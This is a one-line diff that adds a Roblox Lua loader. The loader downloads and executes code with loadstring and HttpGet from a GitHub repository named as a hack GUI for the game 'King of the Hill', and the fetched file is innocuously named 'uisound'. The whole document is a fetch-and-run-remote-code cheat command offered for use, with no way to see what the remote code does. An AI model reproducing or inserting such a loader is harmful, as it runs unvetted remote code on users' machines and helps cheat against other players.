@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ilikeCatexe/King-Of-The-Hill-Script-Hack-Gui/main/uisound", true))()
